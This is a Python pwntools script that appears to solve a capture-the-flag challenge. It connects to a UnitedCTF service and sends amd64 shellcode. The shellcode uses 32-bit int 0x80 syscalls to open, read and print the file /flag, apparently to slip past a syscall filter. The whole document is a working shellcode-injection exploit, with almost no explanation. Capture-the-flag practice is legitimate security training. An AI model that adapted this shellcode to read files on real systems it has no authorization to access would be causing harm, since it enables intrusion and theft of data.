#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 6002

shellcode = """\
    /* open("/flag", O_RDONLY); */
    mov  rbx,0x31337800
    mov  rax,0x67616c662f
    mov  [rbx],rax
    xor  ecx,ecx
    xor  eax,eax
    mov  al,5
    int  0x80

    /* read(fd, 0x31337800, 128); */
    mov ebx,eax
    mov ecx,0x31337800
    xor edx,edx
    mov dl,128
    xor eax,eax
    mov al,3
    int 0x80

    /* write(STDOUT_FILENO, 0x31337800, 128); */
    xor eax,eax
    xor ebx,ebx
    inc ebx
    mov al,4
    mov ecx,0x31337800
    xor edx,edx
    mov dl,128
    int 0x80
"""

r = remote(RHOST, RPORT)
r.recvuntil(b"> ")
r.sendline(asm(shellcode))
r.success(r.recvline().decode())
